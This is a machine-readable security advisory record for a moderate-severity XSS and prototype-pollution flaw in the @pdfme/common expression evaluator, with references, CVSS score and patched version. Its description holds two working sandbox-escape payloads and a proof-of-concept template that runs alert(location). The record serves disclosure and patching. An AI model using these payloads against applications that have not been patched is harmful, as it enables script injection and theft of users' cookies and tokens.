{
  "Severity": "MODERATE",
  "UpdatedAt": "2025-07-10T17:43:53Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "@pdfme/common"
  },
  "Advisory": {
    "DatabaseId": 303181,
    "Id": "GSA_kwCzR0hTQS01NHh2LTk0cXYtMmdmZ84ABKBN",
    "GhsaId": "GHSA-54xv-94qv-2gfg",
    "References": [
      {
        "Url": "https://github.com/pdfme/pdfme/security/advisories/GHSA-54xv-94qv-2gfg"
      },
      {
        "Url": "https://github.com/pdfme/pdfme/pull/1117"
      },
      {
        "Url": "https://github.com/pdfme/pdfme/releases/tag/5.4.1"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-53626"
      },
      {
        "Url": "https://github.com/pdfme/pdfme/commit/0dd54739acff2c249ed68c001a896bee38f0fd85"
      },
      {
        "Url": "https://github.com/advisories/GHSA-54xv-94qv-2gfg"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-54xv-94qv-2gfg"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-53626"
      }
    ],
    "Description": "## Summary\nThe expression evaluation feature in pdfme 5.2.0 to 5.4.0 contains critical vulnerabilities allowing sandbox escape leading to XSS and prototype pollution attacks.\n\n## Details\n\n### 1. Sandbox Escape Leading to XSS\n\nThe expression evaluator's sandbox can be bypassed to execute arbitrary JavaScript code. Attackers can obtain the Function constructor through indirect methods:\n\n```javascript\n// Attack vector 1: Using Object.getOwnPropertyDescriptor\n{ ((f, g) =\u003e f(g(Object), \"constructor\").value)(Object.getOwnPropertyDescriptor, Object.getPrototypeOf)(\"alert(location)\")() }\n\n// Attack vector 2: Using object property access\n{ { f: Object.getOwnPropertyDescriptor }.f({ g: Object.getPrototypeOf }.g(Object), \"constructor\").value(\"alert(location)\")() }\n```\n\nBoth payloads bypass the sandbox restrictions and execute `Function(\"alert(location)\")()`.\n\n### 2. Prototype Pollution\n\nThe expression evaluator allows access to prototype accessor methods which can be exploited with Object.assign to pollute the prototype chain:\n- `__lookupGetter__`\n- `__lookupSetter__`\n- `__defineGetter__`\n- `__defineSetter__`\n\n## Impact\n\nThese vulnerabilities allow attackers to:\n- Execute arbitrary JavaScript code in the context of the application\n- Steal sensitive information including cookies and tokens\n- Modify application behavior through prototype pollution\n- Potentially perform actions on behalf of users\n\n## Proof of Concept\n\nLoading the following template in pdfme triggers `alert(location)`:\n\n```json\n{\n  \"schemas\": [[{\n    \"name\": \"field1\",\n    \"type\": \"text\",\n    \"content\": \"{ ((f, g) =\u003e f(g(Object), 'constructor').value)(Object.getOwnPropertyDescriptor, Object.getPrototypeOf)('alert(location)')() }\",\n    \"position\": { \"x\": 0, \"y\": 0 },\n    \"width\": 100,\n    \"height\": 100\n  }]],\n  \"basePdf\": { \"width\": 100, \"height\": 100 },\n  \"pdfmeVersion\": \"5.4.0\"\n}\n```",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-07-10T17:43:52Z",
    "Severity": "MODERATE",
    "Summary": "@pdfme/common vulnerable to to XSS and Prototype Pollution through its expression evaluation",
    "UpdatedAt": "2025-07-10T23:23:09Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 6.1,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "5.4.1"
      },
      "VulnerableVersionRange": "\u003e= 5.2.0, \u003c 5.4.1"
    }
  ]
}